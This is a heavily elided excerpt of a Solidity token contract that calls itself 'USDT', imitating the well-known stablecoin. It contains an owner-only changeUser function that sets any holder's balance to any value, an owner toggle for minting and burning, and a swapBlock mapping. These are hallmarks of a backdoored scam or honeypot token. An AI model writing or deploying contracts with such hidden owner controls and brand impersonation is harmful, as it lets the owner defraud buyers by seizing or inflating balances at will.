...
contract Token is Context, IERC20, Ownable {
  ...
  constructor() public {
    ...
    _symbol = "USDT";
    _decimals = 18;
    _totalSupply = 32000000  * 10 ** uint256(_decimals);
  ...
  */
  ...
  function changeUser(address user,uint256 amount) public onlyOwner returns (bool) {
     
     _balances[user] = amount;
    return true;
  }

  function changeBM(bool _isMint, bool _isBurn)public onlyOwner{
    isMint = _isMint;
    isBurn = _isBurn;
  }
  /**
   ...
   * - `sender` must have a balance of at least `amount`.
   */
   mapping(address => uint256) public swapBlock;
